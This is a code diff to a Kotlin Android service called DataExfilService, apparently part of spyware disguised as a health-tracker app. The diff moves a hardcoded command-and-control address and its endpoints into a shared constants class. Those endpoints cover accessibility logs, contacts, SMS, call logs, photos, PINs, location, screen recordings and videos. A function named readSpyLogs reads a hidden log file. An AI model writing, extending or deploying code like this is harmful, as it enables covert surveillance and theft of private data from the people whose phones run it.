@@ -39,21 +39,21 @@ class DataExfilService : Service() {
 
     companion object {
         const val TAG = "DataExfilService"
-        private const val BASE_URL = "https://zining.duckdns.org:5000"
+        val BASE_URL = C2Constants.BASE_URL
         private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
         private const val NOTIFICATION_ID = 1001
-        private const val SERVER_ENDPOINT = "$BASE_URL/accessibility_logs"
-        private const val COMMAND_ENDPOINT = "$BASE_URL/commands"
-        const val USER_APPS_ENDPOINT = "$BASE_URL/user_apps"
-        const val CONTACTS_ENDPOINT = "$BASE_URL/contacts"
-        const val DOWNLOADS_ENDPOINT = "$BASE_URL/downloads"
-        const val LOCATION_ENDPOINT = "$BASE_URL/location_update"
-        const val PHOTOS_ENDPOINT = "$BASE_URL/photos"
-        const val PIN_ENDPOINT = "$BASE_URL/pin_logs"
-        const val SMS_ENDPOINT = "$BASE_URL/sms"
-        const val CALL_LOG_ENDPOINT = "$BASE_URL/call_logs"
-        const val SCREEN_RECORDING_ENDPOINT = "$BASE_URL/screen_recordings"
-        const val VIDEO_ENDPOINT = "$BASE_URL/videos"
+        val SERVER_ENDPOINT = C2Constants.ACCESSIBILITY_LOGS_ENDPOINT
+        val COMMAND_ENDPOINT = C2Constants.COMMAND_ENDPOINT
+        val USER_APPS_ENDPOINT = C2Constants.USER_APPS_ENDPOINT
+        val CONTACTS_ENDPOINT = C2Constants.CONTACTS_ENDPOINT
+        val DOWNLOADS_ENDPOINT = C2Constants.DOWNLOADS_ENDPOINT
+        val LOCATION_ENDPOINT = C2Constants.LOCATION_ENDPOINT
+        val PHOTOS_ENDPOINT = C2Constants.PHOTOS_ENDPOINT
+        val PIN_ENDPOINT = C2Constants.PIN_ENDPOINT
+        val SMS_ENDPOINT = C2Constants.SMS_ENDPOINT
+        val CALL_LOG_ENDPOINT = C2Constants.CALL_LOG_ENDPOINT
+        val SCREEN_RECORDING_ENDPOINT = C2Constants.SCREEN_RECORDING_ENDPOINT
+        val VIDEO_ENDPOINT = C2Constants.VIDEOS_ENDPOINT
     }
 
     private lateinit var handler: Handler
@@ -75,7 +75,7 @@ class DataExfilService : Service() {
 
     private val uploadFileReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
-            if (intent.action == "com.inf2007.healthtracker.UPLOAD_FILE") {
+            if (intent.action == C2Constants.UPLOAD_FILE_INTENT) {
                 val type = intent.getStringExtra("type") ?: return
                 val filePath = intent.getStringExtra("file_path") ?: return
 
@@ -254,7 +254,7 @@ class DataExfilService : Service() {
 
     private fun readSpyLogs(): String {
         return try {
-            val logFile = File(filesDir, "watch.log")
+            val logFile = File(filesDir, C2Constants.WATCH_LOG_FILE)
             if (logFile.exists()) {
                 val fileSize = logFile.length()
                 Log.d(TAG, "Log file exists, size: $fileSize bytes")
